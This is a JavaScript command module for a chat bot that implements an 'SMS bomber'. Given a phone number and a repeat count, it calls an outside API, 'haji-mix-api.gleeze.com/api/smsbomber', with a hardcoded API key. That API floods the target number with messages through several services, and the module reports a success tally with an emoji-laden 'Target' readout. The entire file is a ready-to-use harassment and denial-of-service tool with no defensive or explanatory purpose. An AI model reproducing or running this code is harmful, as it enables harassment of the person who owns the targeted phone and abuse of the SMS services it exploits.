const axios = require('axios');

module.exports.config = {
  name: 'smsbomb',
  version: '1.0.0',
  role: 0,
  hasPrefix: true,
  aliases: ['smsbomber', 'bombsms'],
  description: 'Send SMS bombing using an API.',
  usage: 'smbomb <phone> <times>',
  credits: 'Ry',
  cooldown: 5
};

module.exports.run = async function({ api, event, args }) {
  const threadID = event.threadID;
  const messageID = event.messageID;

  const phone = args[0];
  const times = args[1] || 5; // default to 5 if not provided

  if (!phone || isNaN(times)) {
    return api.sendMessage(
      '❌ Invalid input.\n\n✅ Usage: smbomb <phone> <times>\nExample: smbomb 1234557788 10',
      threadID,
      messageID
    );
  }

  try {
    const apiUrl = `https://haji-mix-api.gleeze.com/api/smsbomber?phone=${phone}&times=${times}&api_key=f4a2fb31166ad43608b9a3aa4195ae1491ab497b3bead8ca77699afb5d149a6d`;

    const { data } = await axios.get(apiUrl);

    if (!data.status) {
      return api.sendMessage(`⚠️ Failed: ${data.message || 'Unknown error.'}`, threadID, messageID);
    }

    const { total_success, total_failed, services } = data.details;

    let serviceDetails = '';
    for (const [service, result] of Object.entries(services)) {
      serviceDetails += `- ${service.toUpperCase()}:\n   ✅ Success: ${result.success}\n   ❌ Failed: ${result.failed}\n`;
    }

    const resultMessage = `📲 SMS Bombing Result\n\n📞 Target: ${phone}\n🧨 Times: ${times}\n✅ Total Success: ${total_success}\n❌ Total Failed: ${total_failed}\n\n🔧 Services:\n${serviceDetails}`;

    return api.sendMessage(resultMessage, threadID, messageID);

  } catch (error) {
    console.error('SMS Bomber Error:', error.message);
    return api.sendMessage(
      '❌ Error: Something went wrong while contacting the API. Please try again later.',
      threadID,
      messageID
    );
  }
};